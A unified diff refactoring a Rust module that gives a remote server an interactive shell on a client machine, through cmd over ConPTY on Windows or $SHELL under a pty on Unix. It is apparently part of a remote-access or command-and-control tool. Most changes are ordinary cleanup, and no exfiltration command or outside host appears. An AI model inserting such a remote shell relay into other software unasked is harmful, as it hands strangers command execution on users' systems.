@@ -1,12 +1,27 @@
-use heroinn_util::session::{Session, SessionBase, SessionPacket};
-use std::io::*;
-use std::sync::{atomic::AtomicBool, mpsc::Sender, Arc};
+//! Client-side interactive shell session.
+//!
+//! On Unix the session is a pty-backed child process; on Windows it is a
+//! ConPTY process. Either way, output is relayed to the server through a
+//! [`SessionBase`] channel and input arrives via [`Session::write`].
+
+use std::io::{Read, Write};
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::{Arc, mpsc::Sender};
+
+use heroinn_util::Error;
+use heroinn_util::Result;
+use heroinn_util::session::{ClientSession, Session, SessionBase, SessionPacket};
+
 #[cfg(target_os = "windows")]
 use windows::Win32::System::Threading::{OpenProcess, WaitForSingleObject};
 
 #[cfg(target_os = "windows")]
 use conpty::*;
 
+/// Magic prefix marking an in-band control packet instead of shell input.
+static MAGIC_FLAG: [u8; 2] = [0x37, 0x37];
+
+/// A live shell on the client side.
 pub struct ShellClient {
     id: String,
     clientid: String,
@@ -26,37 +41,30 @@ pub struct ShellClient {
     sender: Sender<SessionBase>,
 }
 
-static MAGIC_FLAG: [u8; 2] = [0x37, 0x37];
-
-pub fn makeword(a: u8, b: u8) -> u16 {
+/// Combine two big-endian bytes into a word.
+fn makeword(a: u8, b: u8) -> u16 {
     ((a as u16) << 8) | b as u16
 }
 
+/// Apply a pty window size to `fd`.
 #[cfg(not(target_os = "windows"))]
-pub fn set_termsize(fd: i32, mut size: Box<libc::winsize>) -> bool {
-    (unsafe { libc::ioctl(fd, libc::TIOCSWINSZ, &mut *size) } as i32) > 0
+fn set_termsize(fd: i32, mut size: libc::winsize) -> bool {
+    (unsafe { libc::ioctl(fd, libc::TIOCSWINSZ, &mut size) } as i32) > 0
 }
 
+/// Look for a shell in the `$SHELL` environment variable.
 #[cfg(not(target_os = "windows"))]
-/// Look for a shell in the `$SHELL` environment variable
 fn default_shell() -> String {
     std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".to_string())
 }
 
-impl Session for ShellClient {
-    #[cfg(target_os = "windows")]
-    fn new_client(sender: Sender<SessionBase>, clientid: &String, id: &String) -> Result<Self> {
+#[cfg(target_os = "windows")]
+impl ClientSession for ShellClient {
+    fn new_client(sender: Sender<SessionBase>, clientid: &str, id: &str) -> Result<Self> {
         let closed = Arc::new(AtomicBool::new(false));
 
-        let process = match conpty::spawn("cmd") {
-            Ok(p) => p,
-            Err(e) => {
-                return Err(std::io::Error::new(
-                    std::io::ErrorKind::InvalidData,
-                    e.to_string(),
-                ));
-            }
-        };
+        let process = conpty::spawn("cmd")
+            .map_err(|e| Error::Other(format!("spawn conpty failed : {}", e)))?;
 
         let pid = process.pid();
 
@@ -72,7 +80,7 @@ impl Session for ShellClient {
                 Ok(p) => p,
                 Err(e) => {
                     log::info!("open shell process error : {}", e);
-                    closed_2.store(true, std::sync::atomic::Ordering::Relaxed);
+                    closed_2.store(true, Ordering::Relaxed);
                     return;
                 }
             };
@@ -82,38 +90,26 @@ impl Session for ShellClient {
             }
 
             log::info!("shell process exit");
-            closed_2.store(true, std::sync::atomic::Ordering::Relaxed);
+            closed_2.store(true, Ordering::Relaxed);
         });
 
-        let writer = match process.input() {
-            Ok(p) => p,
-            Err(e) => {
-                return Err(std::io::Error::new(
-                    std::io::ErrorKind::InvalidData,
-                    e.to_string(),
-                ));
-            }
-        };
-        let mut reader = match process.output() {
-            Ok(p) => p,
-            Err(e) => {
-                return Err(std::io::Error::new(
-                    std::io::ErrorKind::InvalidData,
-                    e.to_string(),
-                ));
-            }
-        };
+        let writer = process
+            .input()
+            .map_err(|e| Error::Other(format!("open shell input failed : {}", e)))?;
+        let mut reader = process
+            .output()
+            .map_err(|e| Error::Other(format!("open shell output failed : {}", e)))?;
 
-        let id_1 = id.clone();
+        let id_1 = id.to_string();
         let closed_1 = closed.clone();
-        let clientid_1 = clientid.clone();
-
+        let clientid_1 = clientid.to_string();
         let sender_1 = sender.clone();
         std::thread::spawn(move || {
             loop {
-                if closed_1.load(std::sync::atomic::Ordering::Relaxed) {
+                if closed_1.load(Ordering::Relaxed) {
                     break;
                 }
+
                 let mut buf: [u8; 1024] = [0; 1024];
                 let size = match reader.read(&mut buf) {
                     Ok(p) => p,
@@ -128,48 +124,48 @@ impl Session for ShellClient {
                     data: buf[..size].to_vec(),
                 };
 
-                match sender_1.send(SessionBase {
+                if let Err(e) = sender_1.send(SessionBase {
                     id: id_1.clone(),
                     clientid: clientid_1.clone(),
                     packet,
                 }) {
-                    Ok(_) => {}
-                    Err(e) => {
-                        log::info!("sender closed : {}", e);
-                        break;
-                    }
-                };
+                    log::info!("sender closed : {}", e);
+                    break;
+                }
             }
             log::info!("shell worker closed");
-            closed_1.store(true, std::sync::atomic::Ordering::Relaxed);
+            closed_1.store(true, Ordering::Relaxed);
         });
 
         Ok(Self {
-            id: id.clone(),
-            clientid: clientid.clone(),
+            id: id.to_string(),
+            clientid: clientid.to_string(),
             closed,
             writer,
             process,
             sender,
         })
     }
+}
 
-    #[cfg(not(target_os = "windows"))]
-    fn new_client(sender: Sender<SessionBase>, clientid: &String, id: &String) -> Result<Self> {
-        use std::{
-            fs::File,
-            os::unix::prelude::{CommandExt, FromRawFd},
-            process::{Command, Stdio},
-        };
+#[cfg(not(target_os = "windows"))]
+impl ClientSession for ShellClient {
+    fn new_client(sender: Sender<SessionBase>, clientid: &str, id: &str) -> Result<Self> {
+        use std::fs::File;
+        use std::os::fd::IntoRawFd;
+        use std::os::unix::prelude::{CommandExt, FromRawFd};
+        use std::process::{Command, Stdio};
 
-        use nix::unistd::fork;
-        use nix::{pty::openpty, unistd::ForkResult};
+        use nix::pty::openpty;
+        use nix::unistd::{ForkResult, fork};
 
         let closed = Arc::new(AtomicBool::new(false));
 
-        let ends = openpty(None, None)?;
-        let master = ends.master;
-        let slave = ends.slave;
+        let ends = openpty(None, None).map_err(|e| Error::Other(format!("openpty failed : {}", e)))?;
+        // `openpty` hands back owning descriptors; take the raw fds so their
+        // lifetime stays managed explicitly by `close()`.
+        let master = ends.master.into_raw_fd();
+        let slave = ends.slave.into_raw_fd();
 
         let mut builder = Command::new(default_shell());
 
@@ -182,15 +178,15 @@ impl Session for ShellClient {
                     let mut status = 0;
                     unsafe { libc::waitpid(i32::from(pid), &mut status, 0) };
                     log::warn!("child process exit!");
-                    closed_2.store(true, std::sync::atomic::Ordering::Relaxed);
+                    closed_2.store(true, Ordering::Relaxed);
                 });
             }
             Ok(ForkResult::Child) => {
-                unsafe { ioctl_rs::ioctl(master, ioctl_rs::TIOCNOTTY) };
+                unsafe { libc::ioctl(master, libc::TIOCNOTTY) };
                 unsafe { libc::setsid() };
-                unsafe { ioctl_rs::ioctl(slave, ioctl_rs::TIOCSCTTY) };
+                unsafe { libc::ioctl(slave, libc::TIOCSCTTY) };
 
-                builder
+                let _ = builder
                     .stdin(unsafe { Stdio::from_raw_fd(slave) })
                     .stdout(unsafe { Stdio::from_raw_fd(slave) })
                     .stderr(unsafe { Stdio::from_raw_fd(slave) })
@@ -198,24 +194,20 @@ impl Session for ShellClient {
                 std::process::exit(0);
             }
             Err(e) => {
-                log::error!("shell fork error : {}", e);
-                return Err(std::io::Error::new(
-                    std::io::ErrorKind::InvalidData,
-                    e.to_string(),
-                ));
+                return Err(Error::Other(format!("shell fork error : {}", e)));
             }
         }
 
         let ptyin = unsafe { File::from_raw_fd(master) };
         let mut ptyout = unsafe { File::from_raw_fd(master) };
 
-        let id_1 = id.clone();
+        let id_1 = id.to_string();
         let closed_1 = closed.clone();
-        let clientid_1 = clientid.clone();
+        let clientid_1 = clientid.to_string();
         let sender_1 = sender.clone();
         std::thread::spawn(move || {
             loop {
-                if closed_1.load(std::sync::atomic::Ordering::Relaxed) {
+                if closed_1.load(Ordering::Relaxed) {
                     break;
                 }
 
@@ -231,25 +223,22 @@ impl Session for ShellClient {
                     data: buf[..size].to_vec(),
                 };
 
-                match sender_1.send(SessionBase {
+                if let Err(e) = sender_1.send(SessionBase {
                     id: id_1.clone(),
                     clientid: clientid_1.clone(),
-                    packet: packet,
+                    packet,
                 }) {
-                    Ok(_) => {}
-                    Err(e) => {
-                        log::info!("sender closed : {}", e);
-                        break;
-                    }
-                };
+                    log::info!("sender closed : {}", e);
+                    break;
+                }
             }
             log::info!("shell worker closed");
-            closed_1.store(true, std::sync::atomic::Ordering::Relaxed);
+            closed_1.store(true, Ordering::Relaxed);
         });
 
         Ok(Self {
-            id: id.clone(),
-            clientid: clientid.clone(),
+            id: id.to_string(),
+            clientid: clientid.to_string(),
             closed,
             sender,
             writer: ptyin,
@@ -258,19 +247,25 @@ impl Session for ShellClient {
             pid: child_pid,
         })
     }
+}
 
-    fn id(&self) -> String {
-        self.id.clone()
+impl Session for ShellClient {
+    fn id(&self) -> &str {
+        &self.id
     }
 
-    fn write(&mut self, data: &Vec<u8>) -> std::io::Result<()> {
-        if data.len() == 3 && self.alive() && data == &vec![MAGIC_FLAG[0], MAGIC_FLAG[1], 0xff] {
+    fn clientid(&self) -> &str {
+        &self.clientid
+    }
+
+    fn write(&mut self, data: &[u8]) -> Result<()> {
+        if data.len() == 3 && data[..2] == MAGIC_FLAG && data[2] == 0xff {
             log::info!("client closed");
             self.close();
             return Ok(());
         }
 
-        if data.len() == 6 && data[0] == MAGIC_FLAG[0] && data[1] == MAGIC_FLAG[1] {
+        if data.len() == 6 && data[..2] == MAGIC_FLAG {
             let row = makeword(data[2], data[3]);
             let col = makeword(data[4], data[5]);
 
@@ -278,24 +273,25 @@ impl Session for ShellClient {
             self.process.resize(col as i16, row as i16).unwrap();
 
             #[cfg(not(target_os = "windows"))]
-            let size = Box::new(libc::winsize {
-                ws_row: row,
-                ws_col: col,
-                ws_xpixel: 0,
-                ws_ypixel: 0,
-            });
-            #[cfg(not(target_os = "windows"))]
-            set_termsize(self.slave, size);
+            set_termsize(
+                self.slave,
+                libc::winsize {
+                    ws_row: row,
+                    ws_col: col,
+                    ws_xpixel: 0,
+                    ws_ypixel: 0,
+                },
+            );
             return Ok(());
         }
 
-        #[cfg(target_os = "windows")]
-        self.writer.write_all(data)?;
-
-        #[cfg(not(target_os = "windows"))]
         self.writer.write_all(data)?;
 
         Ok(())
+    }
+
+    fn alive(&self) -> bool {
+        !self.closed.load(Ordering::Relaxed)
     }
 
     fn close(&mut self) {
@@ -306,14 +302,11 @@ impl Session for ShellClient {
             data: vec![MAGIC_FLAG[0], MAGIC_FLAG[1], 0xff],
         };
 
-        match self.sender.send(SessionBase {
+        let _ = self.sender.send(SessionBase {
             id: self.id.clone(),
             clientid: self.clientid.clone(),
             packet,
-        }) {
-            Ok(_) => {}
-            Err(_) => {}
-        };
+        });
 
         #[cfg(not(target_os = "windows"))]
         unsafe {
@@ -329,26 +322,10 @@ impl Session for ShellClient {
         };
 
         #[cfg(target_os = "windows")]
-        match self.process.exit(0) {
-            Ok(_) => {}
-            Err(_) => {}
-        };
-        self.closed
-            .store(true, std::sync::atomic::Ordering::Relaxed);
-    }
+        if let Err(e) = self.process.exit(0) {
+            log::info!("exit shell process failed : {}", e);
+        }
 
-    fn alive(&self) -> bool {
-        !self.closed.load(std::sync::atomic::Ordering::Relaxed)
-    }
-
-    fn clientid(&self) -> String {
-        self.clientid.clone()
-    }
-
-    fn new(_sender: Sender<SessionBase>, _id: &String, _: &String) -> Result<Self> {
-        Err(std::io::Error::new(
-            std::io::ErrorKind::InvalidData,
-            "not server",
-        ))
+        self.closed.store(true, Ordering::Relaxed);
     }
 }
